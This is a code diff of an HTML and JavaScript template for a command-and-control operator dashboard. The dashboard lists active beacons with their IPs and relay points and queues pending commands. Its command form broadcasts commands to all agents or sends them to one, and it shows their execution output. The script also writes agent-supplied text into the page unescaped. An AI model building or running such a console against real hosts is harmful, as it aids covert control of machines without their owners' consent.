@@ -2,220 +2,141 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL_C2 | GLOBAL_COMMAND</title>
+    <title>C2 MISSION CONTROL</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        :root {
-            --neon-green: #00ff41;
-            --dark-bg: #0a0a0a;
-            --card-bg: #141414;
-            --border-color: #333;
-        }
-
-        body { 
-            background-color: var(--dark-bg); 
-            color: var(--neon-green); 
-            font-family: 'Consolas', 'Courier New', monospace;
-            text-transform: uppercase;
-        }
-
-        /* Scanline effect for that enterprise terminal feel */
-        body::before {
-            content: " ";
-            display: block;
-            position: fixed;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 2000;
-            background-size: 100% 2px, 3px 100%;
-            pointer-events: none;
-        }
-
-        .card { 
-            background-color: var(--card-bg); 
-            border: 1px solid var(--border-color); 
-            border-radius: 0; 
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.05);
-            margin-bottom: 1.5rem;
-        }
-
-        .card-header {
-            border-bottom: 1px solid var(--border-color);
-            font-weight: bold;
-            letter-spacing: 2px;
-        }
-
-        .stats-val { font-size: 2rem; font-weight: bold; color: #fff; }
-
-        .table { color: var(--neon-green); margin-bottom: 0; }
-        .table thead th { border-top: none; color: #888; font-size: 0.8rem; }
+        :root { --accent: #00ff41; --bg: #050505; --card: #111; --text: #e0e0e0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; }
         
-        .form-control, .form-select { 
-            background-color: #000; 
-            color: var(--neon-green); 
-            border: 1px solid var(--border-color); 
-            border-radius: 0;
+        /* High-Contrast Readability */
+        .card { background: var(--card); border: 1px solid #333; border-radius: 4px; height: 100%; }
+        .table { color: var(--text); }
+        .table-striped tbody tr:nth-of-type(odd) { background-color: rgba(255,255,255,0.02); }
+        
+        .terminal-box { 
+            background: #000; border: 1px solid #444; color: #fff; 
+            font-family: 'Consolas', monospace; font-size: 0.85rem;
+            height: 300px; overflow-y: auto; padding: 10px;
         }
-
-        .form-control:focus, .form-select:focus {
-            background-color: #050505;
-            color: var(--neon-green);
-            border-color: var(--neon-green);
-            box-shadow: none;
-        }
-
-        .btn-transmit {
-            background-color: transparent;
-            color: #ff4d4d;
-            border: 1px solid #ff4d4d;
-            border-radius: 0;
-            transition: all 0.3s;
-        }
-
-        .btn-transmit:hover {
-            background-color: #ff4d4d;
-            color: #000;
-        }
-
-        .status-online { 
-            height: 8px; width: 8px; 
-            background-color: var(--neon-green); 
-            border-radius: 50%; 
-            display: inline-block; 
-            box-shadow: 0 0 8px var(--neon-green);
-            margin-right: 10px;
-        }
-
-        .relay-tag {
-            background: #111;
-            padding: 2px 8px;
-            border: 1px solid #444;
-            font-size: 0.75rem;
-            color: #00ccff;
-        }
+        
+        .badge-pending { color: #ff9800; border: 1px solid #ff9800; padding: 2px 5px; font-size: 0.7rem; }
+        .text-neon { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
     </style>
 </head>
 <body class="p-4">
     <div class="container-fluid">
-        <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
-            <h2 class="m-0">CORE_NETWORK_COMMAND // v1.0.4</h2>
-            <div class="text-end">
-                <small class="text-muted">SYSTEM_TIME: </small> <span id="clock"></span>
+        <div class="row mb-3">
+            <div class="col-md-8">
+                <h2 class="text-neon">C2_STRATEGIC_COMMAND <small class="text-muted" style="font-size: 0.9rem;">// ASSET MONITORING</small></h2>
             </div>
-        </div>
-
-        <div class="row">
-            <div class="col-md-3">
-                <div class="card p-3">
-                    <small class="text-muted">TOTAL_ACTIVE_BEACONS</small>
-                    <div class="stats-val">{{ agents|length }}</div>
-                </div>
-            </div>
-            <div class="col-md-3">
-                <div class="card p-3">
-                    <small class="text-muted">PRIMARY_UPTIME</small>
-                    <div class="stats-val text-success">99.9%</div>
-                </div>
-            </div>
-            <div class="col-md-3">
-                <div class="card p-3">
-                    <small class="text-muted">NETWORK_THREAT_LEVEL</small>
-                    <div class="stats-val text-warning">STABLE</div>
-                </div>
-            </div>
-            <div class="col-md-3">
-                <div class="card p-3">
-                    <small class="text-muted">ENCRYPTION_STATUS</small>
-                    <div class="stats-val text-info">AES_256</div>
+            <div class="col-md-4 text-end">
+                <div class="p-2 border border-success">
+                    ACTIVE_BEACONS: <span id="agent-count" class="fw-bold">0</span>
                 </div>
             </div>
         </div>
 
-        <div class="row">
+        <div class="row g-3">
             <div class="col-lg-8">
-                <div class="card">
-                    <div class="card-header">
-                        <span class="text-muted">::</span> ASSET_INVENTORY
-                    </div>
-                    <div class="card-body p-0">
-                        <table class="table table-dark table-hover">
-                            <thead>
-                                <tr>
-                                    <th>STATUS</th>
-                                    <th>HOSTNAME</th>
-                                    <th>IP_ADDR</th>
-                                    <th>ACTIVE_RELAY</th>
-                                    <th>OS_ARCH</th>
-                                    <th>LAST_CHECKIN</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                {% for host, info in agents.items() %}
-                                <tr>
-                                    <td><span class="status-online"></span></td>
-                                    <td>{{ host }}</td>
-                                    <td>{{ info.ip }}</td>
-                                    <td><span class="relay-tag">{{ info.relay }}</span></td>
-                                    <td><small>{{ info.os }}</small></td>
-                                    <td>{{ info.last_seen }}</td>
-                                </tr>
-                                {% endfor %}
+                <div class="card p-3">
+                    <h6>LIVE_ASSET_INVENTORY</h6>
+                    <table class="table table-hover">
+                        <thead>
+                            <tr class="text-muted">
+                                <th>HOSTNAME</th>
+                                <th>IP_ADDRESS</th>
+                                <th>RELAY_POINT</th>
+                                <th>LAST_SEEN</th>
+                                <th>STATUS</th>
+                            </tr>
+                        </thead>
+                        <tbody id="agent-table">
                             </tbody>
-                        </table>
-                    </div>
+                    </table>
                 </div>
             </div>
 
             <div class="col-lg-4">
-                <div class="card" style="height: 100%;">
-                    <div class="card-header bg-dark text-white">LIVE_SYSTEM_LOGS</div>
-                    <div class="card-body bg-black" style="font-size: 0.7rem; color: #555; overflow-y: auto; max-height: 400px;">
-                        <div id="log-feed">
-                            [SYS] BOOT_SEQUENCE_COMPLETE...<br>
-                            [SYS] LISTENING_ON_PORT_5000...<br>
-                            {% for host, info in agents.items() %}
-                            [BEACON] INCOMING_HANDSHAKE_FROM_{{ host }} via {{ info.relay }}...<br>
-                            {% endfor %}
+                <div class="card p-3">
+                    <h6>OUTBOUND_QUEUE</h6>
+                    <div id="queue-list" class="terminal-box" style="height: 100%;">
                         </div>
-                    </div>
                 </div>
             </div>
-        </div>
 
-        <div class="card mt-2">
-            <div class="card-header bg-danger text-black"><b>INSTRUCTION_UPLINK</b></div>
-            <div class="card-body">
-                <form action="/admin/send_cmd" method="POST">
-                    <div class="row g-2">
-                        <div class="col-md-3">
-                            <select name="target" class="form-select">
-                                <option value="ALL">BROADCAST_ALL</option>
-                                {% for host in agents %}
-                                <option value="{{ host }}">{{ host }}</option>
-                                {% endfor %}
+            <div class="col-lg-6">
+                <div class="card p-3">
+                    <h6>INSTRUCTION_UPLINK</h6>
+                    <form action="/admin/send_cmd" method="POST" id="cmd-form">
+                        <div class="input-group">
+                            <select name="target" id="target-select" class="form-select bg-dark text-white" style="max-width: 150px;">
+                                <option value="ALL">BROADCAST</option>
                             </select>
+                            <input type="text" name="command" class="form-control bg-dark text-white" placeholder="ENTER COMMAND..." required>
+                            <button class="btn btn-outline-success">EXECUTE</button>
                         </div>
-                        <div class="col-md-7">
-                            <input type="text" name="command" class="form-control" placeholder="EXECUTE_STRING > " required autofocus>
+                    </form>
+                </div>
+            </div>
+
+            <div class="col-lg-6">
+                <div class="card p-3">
+                    <h6>EXECUTION_OUTPUT_FEED</h6>
+                    <div id="results-feed" class="terminal-box">
                         </div>
-                        <div class="col-md-2">
-                            <button type="submit" class="btn btn-transmit w-100">TRANSMIT_CMD</button>
-                        </div>
-                    </div>
-                </form>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // Update Clock
-        function updateClock() {
-            const now = new Date();
-            document.getElementById('clock').innerText = now.toISOString().split('T')[1].split('.')[0] + ' UTC';
+        async function updateDashboard() {
+            try {
+                const response = await fetch('/api/stats');
+                const data = await response.json();
+
+                // 1. Update Count
+                document.getElementById('agent-count').innerText = data.total_count;
+
+                // 2. Update Table
+                const table = document.getElementById('agent-table');
+                table.innerHTML = '';
+                const select = document.getElementById('target-select');
+                
+                // Clear and re-fill select except for 'ALL'
+                select.innerHTML = '<option value="ALL">BROADCAST</option>';
+
+                for (const [host, info] of Object.entries(data.agents)) {
+                    table.innerHTML += `<tr>
+                        <td><b>${host}</b></td>
+                        <td>${info.ip}</td>
+                        <td><span class="text-info">${info.relay}</span></td>
+                        <td>${info.last_seen}</td>
+                        <td><span class="text-success">● ONLINE</span></td>
+                    </tr>`;
+                    
+                    select.innerHTML += `<option value="${host}">${host}</option>`;
+                    
+                    // Update Results Feed if available
+                    if(info.last_result) {
+                        const resFeed = document.getElementById('results-feed');
+                        if (!resFeed.innerHTML.includes(info.last_result)) {
+                            resFeed.innerHTML = `<div><span class="text-warning">[${host}]</span> ${info.last_result}</div>` + resFeed.innerHTML;
+                        }
+                    }
+                }
+
+                // 3. Update Queue
+                const qList = document.getElementById('queue-list');
+                qList.innerHTML = '';
+                for (const [host, cmd] of Object.entries(data.queue)) {
+                    qList.innerHTML += `<div><span class="badge-pending">PENDING</span> ${host} -> ${cmd}</div>`;
+                }
+            } catch (e) { console.error("Update failed", e); }
         }
-        setInterval(updateClock, 1000);
-        updateClock();
+
+        setInterval(updateDashboard, 3000); // Poll every 3 seconds
+        updateDashboard();
     </script>
 </body>
 </html>
